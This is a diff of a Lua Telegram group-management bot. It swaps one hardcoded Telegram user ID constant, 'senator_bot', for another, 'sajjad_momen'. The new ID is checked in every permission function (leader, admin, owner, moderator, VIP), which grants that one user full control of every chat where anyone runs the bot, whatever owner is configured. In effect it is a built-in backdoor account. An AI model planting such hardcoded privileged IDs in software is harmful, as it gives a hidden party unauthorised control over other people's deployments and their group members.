@@ -15,7 +15,7 @@ local minute = 60
 local hour = 3600
 local day = 86400
 local week = 604800
-local senator_bot = 170146015
+local sajjad_momen = 228572542
 http.TIMEOUT = 10
 local color = {
   black = {30, 40},
@@ -160,9 +160,9 @@ local sudo_users = _config.Sudo_Users
 local bot_owner = database:get("Bot:BotOwner")
 local run = database:get("Bot:Run") or "True"
 local bot_id = database:get("Bot:BotAccount") or tonumber(_redis.Bot_ID)
-local is_senator_bot = function(user_id)
+local is_sajjad_momen = function(user_id)
   local var = false
-  if user_id == tonumber(senator_bot) then
+  if user_id == tonumber(sajjad_momen) then
     var = true
   end
   return var
@@ -172,7 +172,7 @@ local is_leader = function(user_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(senator_bot) then
+  if user_id == tonumber(sajjad_momen) then
     var = true
   end
   return var
@@ -200,7 +200,7 @@ local is_admin = function(user_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(senator_bot) then
+  if user_id == tonumber(sajjad_momen) then
     var = true
   end
   return var
@@ -223,7 +223,7 @@ local is_owner = function(user_id, chat_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(senator_bot) then
+  if user_id == tonumber(sajjad_momen) then
     var = true
   end
   return var
@@ -252,7 +252,7 @@ local is_momod = function(user_id, chat_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(senator_bot) then
+  if user_id == tonumber(sajjad_momen) then
     var = true
   end
   if user_id == tonumber(our_id) then
@@ -288,7 +288,7 @@ local is_vipmem = function(user_id, chat_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(senator_bot) then
+  if user_id == tonumber(sajjad_momen) then
     var = true
   end
   return var
